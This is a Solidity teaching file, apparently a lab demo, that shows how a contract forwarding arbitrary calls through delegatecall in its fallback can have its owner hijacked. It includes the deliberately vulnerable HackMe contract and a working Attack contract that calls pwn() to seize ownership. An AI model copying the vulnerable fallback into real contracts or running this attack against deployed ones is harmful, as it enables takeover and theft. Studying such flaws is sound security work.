// SPDX-License-Identifier: MIT
pragma solidity ^0.8.10;

/*
HackMe is a contract that uses delegatecall to execute code.
It is not obvious that the owner of HackMe can be changed since there is no
function inside HackMe to do so. However an attacker can hijack the
contract by exploiting delegatecall. Let's see how.

1. Alice deploys HackedLib
2. Alice deploys HackMe with address of HackedLib
3. Eve deploys Attack with address of HackMe
4. Eve calls Attack.attack()
5. Attack is now the owner of HackMe

What happened?
Eve called Attack.attack().
Attack called the fallback function of HackMe sending the function
selector of pwn(). HackMe forwards the call to HackedLib using delegatecall.
Here msg.data contains the function selector of pwn().
This tells Solidity to call the function pwn() inside HackedLib.
The function pwn() updates the owner to msg.sender.
Delegatecall runs the code of HackedLib using the context of HackMe.
Therefore HackMe's storage was updated to msg.sender where msg.sender is the
caller of HackMe, in this case Attack.
*/

import "hardhat/console.sol";

contract HackedLib {
    address public owner;

    constructor(address _owner){
       owner = _owner;
    }

    function getOwner() public view returns(address){
        return owner;
    }
    function pwn() public {
        console.log("sender is %s", msg.sender);
        owner = msg.sender;
    }
}

contract HackMe {
    address public owner;
    HackedLib public lib;

    constructor(address _owner, HackedLib _HackedLib) {
        owner = _owner;
        lib = HackedLib(_HackedLib);
    }

    fallback() external payable {
        address(lib).delegatecall(msg.data);
    }
}

contract Attack {
    address public hackMe;
    address public attacker;

    constructor(address _hackMe) {
        hackMe = _hackMe;
    }

    function attack() public {
        attacker = address(this);
        hackMe.call(abi.encodeWithSignature("pwn()"));
    }
}
